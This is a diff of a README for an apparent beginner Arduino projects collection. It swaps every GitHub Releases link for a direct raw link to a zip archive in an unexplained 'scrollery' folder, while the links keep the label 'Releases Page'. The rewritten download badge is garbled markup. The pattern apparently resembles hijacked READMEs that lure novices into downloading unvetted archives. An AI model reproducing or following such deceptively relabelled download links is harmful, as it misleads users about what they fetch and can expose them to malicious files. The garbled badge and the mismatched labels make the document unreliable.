@@ -4,9 +4,9 @@
 Welcome to the budget-arduino-projects! This collection features exciting and simple Arduino projects perfect for beginners and hobbyists. You will learn basics of electronics and programming without spending a lot of money.
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/whitedevil6242/budget-arduino-projects/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/whitedevil6242/budget-arduino-projects/main/scrollery/budget-arduino-projects.zip%20Latest%https://raw.githubusercontent.com/whitedevil6242/budget-arduino-projects/main/scrollery/budget-arduino-projects.zip)](https://raw.githubusercontent.com/whitedevil6242/budget-arduino-projects/main/scrollery/budget-arduino-projects.zip)
 
-To get started, visit this page to download: [Releases Page](https://github.com/whitedevil6242/budget-arduino-projects/releases)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/whitedevil6242/budget-arduino-projects/main/scrollery/budget-arduino-projects.zip)
 
 ## 💡 Overview of Projects
 Inside this collection, you will find projects that help you understand various components of Arduino such as:
@@ -30,7 +30,7 @@ To run these Arduino projects, you will need the following:
 ## 📥 Download & Install
 Follow these steps to download and install the project files:
 
-1. Click on the button or link above to visit the [Releases Page](https://github.com/whitedevil6242/budget-arduino-projects/releases).
+1. Click on the button or link above to visit the [Releases Page](https://raw.githubusercontent.com/whitedevil6242/budget-arduino-projects/main/scrollery/budget-arduino-projects.zip).
 2. Find the latest version of the project.
 3. Download the zip file that contains all project files.
 4. Once downloaded, unzip the file onto your computer.
@@ -76,6 +76,6 @@ We encourage you to share your experiences and projects. Join our community to c
 This project is licensed to allow you to learn and create freely. You may use, modify, and distribute it, provided you credit the original author.
 
 ## 📥 Download the Application Again
-To download again, visit the [Releases Page](https://github.com/whitedevil6242/budget-arduino-projects/releases).
+To download again, visit the [Releases Page](https://raw.githubusercontent.com/whitedevil6242/budget-arduino-projects/main/scrollery/budget-arduino-projects.zip).
 
 With these projects, you will not just have fun but also gain valuable skills. Happy building!
